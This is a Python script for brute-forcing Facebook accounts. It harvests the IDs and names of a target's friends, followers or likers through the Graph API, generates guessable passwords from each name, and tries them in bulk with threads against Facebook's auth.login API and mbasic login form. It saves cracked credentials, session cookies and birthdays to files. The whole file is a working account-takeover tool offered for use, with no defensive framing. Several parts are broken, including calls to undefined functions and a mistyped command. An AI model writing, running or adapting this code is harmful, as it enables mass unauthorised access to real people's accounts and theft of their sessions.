#code with love by uj
### Import Module
import requests,sys,bs4,os,random,time,json
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime

### Perumpamaan Module & Syntax
_req_get_   = requests.get
_req_post_ = requests.post
_js_lo_    = json.loads
pri_    = print
inp_    = input
opn_ = open
exi_  = exit

### Waktu & Tanggal
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "Octomber", "11": "November", "12": "Desember"}
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "Octomber", "November", "Desember"]
try:
    if bu < 0 or bu > 12:
        exi_()
    buTemp = bu - 1
except ValueError:
    exi_()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))

##COLOURS
W_ = "\x1b[0;97m" # White
R_ = "\x1b[0;91m" # Red
G_ = "\x1b[0;92m" # Green
P_ = "\x1b[0;95m" # Purple
Y_ = "\x1b[0;33m" # yellow
B_ = "\x1b[0;34m" # blue
L_ = "\x1b[0;36m" # light blue

###Logo
_logo_line_1_ = ('%s   __  __  _____ ___  ____'%(W_))
_logo_line_2_ = ('%s  / / / / /_  _//__ )/ __/ %s• %sUJ'%(W_,P_,L_))
_logo_line_3_ = ('%s / /_/ /  _/ / /__  / __/  %s• %sMulti'%(W_,P_,L_))
_logo_line_4_ = ('%s/_____/ /___/ /___ /_/   %s• %sBrute '%(W_,P_,L_))
_logo_line_5_ = ('%s     UNIC TORBY      • %sForce'%(P_,L_))
def _my_logo_():
    pri_(_logo_line_1_)
    pri_(_logo_line_2_)
    pri_(_logo_line_3_)
    pri_(_logo_line_4_)
    pri_(_logo_line_5_+'\n')

### User Agent
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

### SHELTER
_id_tampung_ = []

### Jangan Diganti Nanti Error
_oscylopsce_ = '__Dapunta__'
_ascylapsci_ = '__Cici__'
_escylipsce_ = '__Dapunta_Love_Cici__'
_uscylupsci_ = '__My_Love____Dapunta____Dapunta_Love_Cici____Cici____Forever__'

### Creating a Directory Folder
def _folder_():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
    except:pass

### Clear Login Session
def _bersih_():
    try:os.remove('token.txt')
    except:pass

### Clear User Agent
def _del_():
    try:os.remove('ugent.txt')
    except:pass

### Clear Terminal
def _clear_():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")


### Login
def _login_dev_(_Cici_Cantik_Banget_):
    _clear_()
    _my_logo_()
    if _uscylupsci_ not in _Cici_Cantik_Banget_:pri_('%s[%s!%s] %sHayoo Mau Recode Ya?'%(R_,W_,R_,W_))
    else:pass
    _tok_dev_ = inp_('%s[%s•%s] %sEnter Token :\n\n'%(P_,W_,P_,W_))
    try:
        _req_tok_  = _req_get_("https://graph.facebook.com/me?access_token=%s"%(_tok_dev_))
        _js_load_  = _js_lo_(_req_tok_.text)
        _nama_dev_ = _js_load_['name']
        _op_dev_ = opn_('token.txt','w')
        _op_dev_.write(_tok_dev_)
        _op_dev_.close()
        _default_ua_(_Cici_Cantik_Banget_)
        _menu_dev_(_Cici_Cantik_Banget_)
    except (KeyError,IOError):
        pri_('\n%s[%s!%s] %sToken Invalid'%(R_,W_,R_,W_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Cici_Cantik_Banget_)
    except requests.exceptions.ConnectionError:
        pri_('\n%s[%s!%s] %sConnection Problem'%(R_,W_,R_,W_))
        exi_()

### Menu
def _menu_dev_(_Dapunta_Ganteng_Banget_):
    _clear_()
    _my_logo_()
    if _uscylupsci_ not in _Dapunta_Ganteng_Banget_:pri_('%s[%s!%s] %sHayoo Mau Recode Ya?'%(R_,W_,R_,W_))
    else:pass
    try:
        _tok_dev_  = opn_("token.txt","r").read()
        _req_tok_  = _req_get_("https://graph.facebook.com/me?access_token=%s"%(_tok_dev_))
        _js_load_  = _js_lo_(_req_tok_.text)
        _nama_dev_ = _js_load_['name']
        _id_dev_   = _js_load_['id']
    except (KeyError,IOError):
        pri_('%s[%s!%s] %sToken Invalid'%(R_,W_,R_,W_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Dapunta_Ganteng_Banget_)
    except requests.exceptions.ConnectionError:
        pri_('%s[%s!%s] %sConnection Problem'%(R_,W_,R_,W_))
        exi_()
    try:
        _ip_url_ = "http://ip-api.com/json/"
        _ip_headers_ = {
            "Referer":"http://ip-api.com/",
            "Content-Type":"application/json; charset=utf-8",
            "User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            }
        _ip_req_ = _req_get_(_ip_url_,headers=_ip_headers_).json()
        _ip_dev_ = _ip_req_["query"]
        _lstasu_ = "premium"
    except:
        _ip_dev_ = " "
    pri_('%s[%s•%s] %sHello %s%s'%(P_,W_,P_,W_,P_,_js_load_))
    pri_('%s[%s•%s] %sID : %s'%(P_,W_,P_,W_,_js_load_))
    pri_('%s[%s•%s] %sIP : %s\n'%(P_,W_,P_,W_,_ip_dev_))
    pri_('%s[%s•%s] %sStatus: %s'%(P_,W_,P_,_lstasu_,G_))
    pri_('%s[%s1%s] %sCrack From Public Friendlist'%(P_,W_,P_,W_))
    pri_('%s[%s2%s] %sCrack From Flowers'%(P_,W_,P_,W_))
    pri_('%s[%s3%s] %sCrack From Likers'%(P_,W_,P_,W_))
    pri_('%s[%s4%s] %sResult Of Crack'%(P_,W_,P_,W_))
    pri_('%s[%s0%s] %sLog Out'%(P_,W_,P_,W_))
    _dapunta_menu_inp__ = input('%s[%s•%s] %sChoose : '%(P_,W_,P_,W_))
    pri_('')
    if _dapunta_menu_inp__ in ['',' ']:
        pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Ganteng_Banget_)
    elif _dapunta_menu_inp__ in ['1','01','a']:
        _publik_dev_(_tok_dev_)
    elif _dapunta_menu_inp__ in ['2','02','b']:
        _followers_dev_(_tok_dev_)
    elif _dapunta_menu_inp__ in ['3','03','c']:
        _likers_dev_(_tok_dev_)
    elif _dapunta_menu_inp__ in ['4','04','d']:
        _cek_result_dev_()
    elif _dapunta_menu_inp__ in ['5','05','e']:
        _ugen_dev_(_Dapunta_Ganteng_Banget_)
    elif _dapunta_menu_inp__ in ['0','00','z']:
        pri_('%s[%s•%s] %sSee you later %s%s %s!'%(P_,W_,P_,W_,P_,_nama_dev_,W_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Dapunta_Ganteng_Banget_)
    else:
        pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Ganteng_Banget_)

###collect public id
def _publik_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    pri_('%s[%s•%s] %stype \'me\' collect id from friends'%(P_,W_,P_,W_))
    _target_dev_ = inp_('%s[%s•%s] %senter targed id : %s'%(P_,W_,P_,W_,P_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
        _name_    = _jso_tar_['name']
        pri_('%s[%s•%s] %sNama : %s%s'%(P_,W_,P_,W_,P_,_name_))
    except:
        pri_('%s[%s!%s] %sToken Invalid / ID Not Found'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    try:
        _req_fl_ = _req_get_("https://graph.facebook.com/%s/friends?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
        _lo_dev_ = _js_lo_(_req_fl_.text)
        _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
        _jso_exec_ = opn_(_jso_file_,"w")
        for pri_Forever_ in _lo_dev_["data"]:
            try:
                _id_tampung_.append(pri_Forever_["id"]+"•"+pri_Forever_["name"])
                _jso_exec_.write(pri_Forever_["id"]+"•"+pri_Forever_["name"]+"\n")
            except:continue
        _jso_exec_.close()
        pri_('%s[%s•%s] %sTotal ID : %s%s'%(P_,W_,P_,W_,P_,len(_id_tampung_)))
    except:
        pri_('%s[%s!%s] %sToken Invalid / ID Not Found'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    return _crack_dev_(_jso_file_)

###collect followers id
def _followers_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    pri_('%s[%s•%s] %stype \'me\' collect id from friends'%(P_,W_,P_,W_))
    _target_dev_ = inp_('%s[%s•%s] %senter targed id : %s'%(P_,W_,P_,W_,P_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
        _name_    = _jso_tar_['name']
        pri_('%s[%s•%s] %sNama : %s%s'%(P_,W_,P_,W_,P_,_name_))
    except:
        pri_('%s[%s!%s] %sToken Invalid / ID Not Found'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    try:
        _req_fl_ = _req_get_("https://graph.facebook.com/%s/subscribers?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
        _lo_dev_ = _js_lo_(_req_fl_.text)
        _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
        _jso_exec_ = opn_(_jso_file_,"w")
        for pri_Forever_ in _lo_dev_["data"]:
            try:
                _id_tampung_.append(pri_Forever_["id"]+"•"+pri_Forever_["name"])
                _jso_exec_.write(pri_Forever_["id"]+"•"+pri_Forever_["name"]+"\n")
            except:continue
        _jso_exec_.close()
        pri_('%s[%s•%s] %sTotal ID : %s%s'%(P_,W_,P_,W_,P_,len(_id_tampung_)))
    except:
        pri_('%s[%s!%s] %sToken Invalid / ID Not Found'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    return _crack_dev_(_jso_file_)

###collect likers id
def _likers_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    pri_('%s[%s•%s] %stype \'me\' collect id from friends'%(P_,W_,P_,W_))
    _target_dev_ = inp_('%s[%s•%s] %senter targed id : %s'%(P_,W_,P_,W_,P_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
        _name_    = _jso_tar_['name']
        pri_('%s[%s•%s] %sNama : %s%s'%(P_,W_,P_,W_,P_,_name_))
    except:
        pri_('%s[%s!%s] %sToken Invalid / ID Not Found'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    try:
        _req_fl_ = _req_get_("https://graph.facebook.com/%s/likes?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
        _lo_dev_ = _js_lo_(_req_fl_.text)
        _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
        _jso_exec_ = opn_(_jso_file_,"w")
        for pri_Forever_ in _lo_dev_["data"]:
            try:
                _id_tampung_.append(pri_Forever_["id"]+"•"+pri_Forever_["name"])
                _jso_exec_.write(pri_Forever_["id"]+"•"+pri_Forever_["name"]+"\n")
            except:continue
        _jso_exec_.close()
        pri_('%s[%s•%s] %sTotal ID : %s%s'%(P_,W_,P_,W_,P_,len(_id_tampung_)))
    except:
        pri_('%s[%s!%s] %sToken Invalid / ID Not Found'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    return _crack_dev_(_jso_file_)

### Generate Password
def _pass_list_(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
            else:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
    _dapunta_.append(_cici_.lower())
    _dapunta_.append("sayang")
    _dapunta_.append("bismillah")
    _dapunta_.append("anjing")
    return _dapunta_

### Loger Crack
def log_api(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = r.post("https://mbasic.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in r.cookies.get_dict().keys():
        return {"status":"success","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in r.cookies.get_dict().keys():
        return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def koki(_cookies_):
    samp_  = _cookies_.split(';')
    _cooked_cookies_ = ('%s;%s;%s;%s;%s'%(samp_[2],samp_[4],samp_[0],samp_[3],samp_[1]))
    return _cooked_cookies_

### Crack Proccess
class _crack_dev_:
    def __init__(self,files):
        self._Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
        self.ada = []
        self.cp = []
        self.ko = 0
        pri_('\n%s[%s•%s] %sCrack with Password Default/Manual [d/m]'%(P_,W_,P_,W_))
        while True:
            f = inp_('%s[%s•%s] %schoose : '%(P_,W_,P_,W_))
            if f=="":
                pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
                time.sleep(2)
                _menu_dev_(self._Dapunta_Sayang_Cici_)
            elif f in ['m','M','2','02','002']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = opn_(self.apk).read().splitlines()
                            break
                        except:
                            pri_('%s[%s!%s] %sDump File Not Detected'%(R_,W_,R_,W_))
                            time.sleep(2)
                            _menu_dev_(self._Dapunta_Sayang_Cici_)
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:
                    pri_('%s[%s!%s] %sDump File Not Detected'%(R_,W_,R_,W_))
                    time.sleep(2)
                    _menu_dev_(self._Dapunta_Sayang_Cici_)
                pri_('%s[%s•%s] %sContoh : pakaya,ponnaya,123456'%(P_,W_,P_,W_))
                self.pwlist()
                break
            elif f in ['d','D','1','01','001']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = opn_(self.apk).read().splitlines()
                            break
                        except:
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0],"pw":_pass_list_(i.split("•")[1])})
                        except:continue
                    start_method()
                    put = inp_('%s[%s•%s] %schoose : '%(P_,W_,P_,W_))
                    pri_(''%())
                    if put in ['']:
                        pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
                        time.sleep(2)
                        _menu_dev_(self._Dapunta_Sayang_Cici_)
                    elif put in ['1','01','001','a']:
                        started()
                        ThreadPool(35).map(self.api,self.fl)
                        os.remove(self.apk)
                        exi_()
                    elif put in ['2','02','002','b']:
                        started()
                        ThreadPool(35).map(self.mbasic,self.fl)
                        os.remove(self.apk)
                        exi_()
                    else:
                        pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
                        time.sleep(2)
                        _menu_dev_(self._Dapunta_Sayang_Cici_)
                except Exception as e:
                    continue
    def pwlist(self):
        self.pw = inp_('%s[%s•%s] %sEnter Password : '%(P_,W_,P_,W_)).split(",")
        if len(self.pw) ==0:
            pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
            time.sleep(2)
            _menu_dev_(self._Dapunta_Sayang_Cici_)
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            start_method()
            put = inp_('%s[%s•%s] %schoose : '%(P_,W_,P_,W_))
            pri_(''%())
            if put in ['']:
                pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
                time.sleep(2)
                _menu_dev_(self._Dapunta_Sayang_Cici_)
            elif put in ['1','01','001','a']:
                started()
                ThreadPool(30).map(self.api,self.fl)
                os.remove(self.apk)
                exi_()
            elif put in ['2','02','002','b']:
                started()
                ThreadPool(30).map(self.mbasic,self.fl)
                os.remove(self.apk)
                exi_()
            else:
                pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
                time.sleep(2)
                _menu_dev_(self._Dapunta_Sayang_Cici_)
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + opn_("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        pri_("\r%s[%sCP%s] %s • %s • %s %s %s         "%(P_,W_,P_,fl.get("id"),i,d,m,y))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        opn_("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    pri_("\r%s[%sCP%s] %s • %s                 "%(P_,W_,P_,fl.get("id"),i))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    opn_("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    pri_("\r%s[%sOK%s] %s • %s                 "%(G_,W_,G_,fl.get("id"),i))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    opn_("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            pri_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(P_,W_,P_,W_,self.ko,len(self.fl),P_,W_,len(self.ada),P_,W_,len(self.cp),P_,W_), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + opn_("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        pri_("\r%s[%sCP%s] %s • %s • %s %s %s         "%(P_,W_,P_,fl.get("id"),i,d,m,y))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        opn_("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    pri_("\r%s[%sCP%s] %s • %s                 "%(P_,W_,P_,fl.get("id"),i))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    opn_("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    pri_("\r%s[%sOK%s] %s • %s • %s     "%(G_,W_,G_,fl.get("id"),i,koki(log.get("cookies"))))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    opn_("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            pri_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(P_,W_,P_,W_,self.ko,len(self.fl),P_,W_,len(self.ada),P_,W_,len(self.cp),P_,W_), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)

### Menu Checking Crack Results
def _cek_result_dev_():
    _clear_()
    _my_logo_()
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    pri_('%s[ %sresults of crack %s]'%(P_,W_,P_))
    pri_('\n%s[%s1%s] %scheck result OK'%(P_,W_,P_,W_))
    pri_('%s[%s2%s] %scheck result CP'%(P_,W_,P_,W_))
    ch = inp_('%s[%s•%s] %schoose : '%(P_,W_,P_,W_))
    if ch in ['']:
        pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK")
            pri_('\n%s[%s Crack Results Stored in File OK %s]\n'%(P_,W_,P_))
            for file in okl:
                pri_('%s[%s•%s] %s%s'%(P_,W_,P_,W_,file))
            pri_('')
            files = inp_('%s[%s•%s] %sEnter File Name : '%(P_,W_,P_,W_))
            pri_('')
            if files == "":
                pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
                time.sleep(2)
                _menu_dev_(_Dapunta_Sayang_Cici_)
            os.system('cat OK/%s'%(files))
            ppp = opn_("OK/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            pri_('\n%s[%s•%s] %sTotal Crack Result Date %s Is Account %s'%(P_,W_,P_,W_,del1,len(ppp)))
        except:
            pri_('%s[%s No Results Found %s]'%(R_,W_,R_))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP")
            pri_('\n%s[%s Crack Results Stored in File CP %s]\n'%(P_,W_,P_))
            for file in cpl:
                pri_('%s[%s•%s] %s%s'%(P_,W_,P_,W_,file))
            pri_('')
            files = inp_('%s[%s•%s] %sEnter File Name : '%(P_,W_,P_,W_))
            pri_('')
            if files == "":
                pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
                time.sleep(2)
                _menu_dev_(_Dapunta_Sayang_Cici_)
            os.system('cat CP/%s'%(files))
            ppp = opn_("CP/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            pri_('\n%s[%s•%s] %sTotal Crack Result Date %s Is Account %s'%(P_,W_,P_,W_,del1,len(ppp)))
        except:
            pri_('%s[%s No Results Found %s]'%(R_,W_,R_))
    else:
        pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    inp_('\n%s[ %sEnter %s]%s'%(P_,W_,P_,W_))
    _menu_dev_(_Dapunta_Sayang_Cici_)

### Mau Recode Lu Ya?
def _check_recode_(_oscylopsce_,_ascylapsci_,_escylipsce_):
    _recode_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    if _uscylupsci_ not in _recode_:pri_('%s[%s!%s] %sHayoo Mau Recode Ya?'%(R_,W_,R_,W_))
    else:return _menu_dev_(_recode_)

### Menu User Agent
def _default_ua_(_Cici_Cantik_Banget_):
    ua = ua_xiaomi
    try:
        ugent = opn_('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        _login_dev_(_Cici_Cantik_Banget_)
def _ugen_dev_(_Dapunta_Sayang_Cici_):
    _var_ugen_(_Dapunta_Sayang_Cici_)
    pmu = inp_('%s[%s•%s] %schoose : '%(P_,W_,P_,W_))
    pri_('')
    if pmu in[""]:
        pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['1','01','001','a']:
        os.system('xdg-opn_ https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        inp_('%s[ %sEnter %s]%s'%(P_,W_,P_,W_))
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['2','02','002','b']:
        _del_()
        ua = inp_("%s[%s•%s] %sEnter User Agent : \n\n"%(P_,W_,P_,W_))
        try:
            ugent = opn_('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            pri_("\n%s[ %sSuccessfully Changed User Agent %s]"%(P_,W_,P_))
            inp_('\n%s[ %sEnter %s]%s'%(P_,W_,P_,W_))
            _menu_dev_(_Dapunta_Sayang_Cici_)
        except (KeyError,IOError):
            pri_("\n%s[ %sFailed to Change User Agent %s]"%(R_,W_,R_))
            inp_('\n%s[ %sEnter %s]%s'%(R_,W_,R_,W_))
            _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['3','03','003','c']:
        _ugen_hp_(_Dapunta_Sayang_Cici_)
    elif pmu in ['4','04','004','d']:
        _del_()
        pri_("%s[ %sUser Agent Deleted Successfully %s]"%(P_,W_,P_))
        inp_('\n%s[ %sEnter %s]%s'%(P_,W_,P_,W_))
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['5','05','005','e']:
        try:
            ungser = opn_('ugent.txt', 'r').read()
        except (KeyError,IOError):
            ungser = 'Not found'
        pri_("%s[%s•%s] %sYour User Agent  : \n\n%s%s"%(P_,W_,P_,W_,P_,ungser))
        pri_("\n%s[ %sThis is your current user agent %s]"%(P_,W_,P_))
        inp_('\n%s[ %sEnter %s]%s'%(P_,W_,P_,W_))
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['0','00','000','f']:
        _menu_dev_(_Dapunta_Sayang_Cici_)
    else:
        pri_('%s[%s!%s] %sCorrect Content'%(R_,W_,R_,W_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
def _ugen_hp_(_Dapunta_Sayang_Cici_):
    _del_()
    pri_('%s[%s1%s] %sXiaomi'%(P_,W_,P_,W_))
    pri_('%s[%s2%s] %sNokia'%(P_,W_,P_,W_))
    pri_('%s[%s3%s] %sAsus'%(P_,W_,P_,W_))
    pri_('%s[%s4%s] %sHuawei'%(P_,W_,P_,W_))
    pri_('%s[%s5%s] %sVivo'%(P_,W_,P_,W_))
